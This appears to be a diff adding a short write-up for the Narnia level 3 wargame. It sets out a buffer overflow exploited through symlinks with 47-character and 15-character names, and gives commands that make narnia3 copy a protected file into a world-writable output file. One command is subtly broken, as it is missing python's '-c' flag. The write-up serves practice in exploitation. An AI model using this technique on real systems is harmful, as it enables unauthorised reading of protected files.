@@ -1,0 +1,15 @@
+1. Overflow the buffers for infile and outfile.. 
+2. Bash skips the NULL byte so:
+    - Create 2 softlinks:
+        - 47 (32 + 15) char lenghth 'AAAAAAAAAAAA......' for inputfile linked to the password file we want (full 32bytes for first buff, 15 for outbuffer since the '\0' wil be inserted to the last position in the buffer - NULL byte will be appended by python to the end of our string)
+        - 15 char 'AAAAAA....' soft link linked to our output file. We need to give permissions to narnia4 or simply to anyone for read and write access. Also possibly make our directory readable/executable so this file is reachable.
+
+
+ln -s /home/jozsi/README.txt `python2 -c "print 'A'*47"`
+touch password
+chmod 666 password
+ln -s password `python2 - "print 'A'*15"`
+./narnia3 `python2 -c "print 'A'*47"`
+
+
+Contents of jozsi's README.txt should now be in our password file!
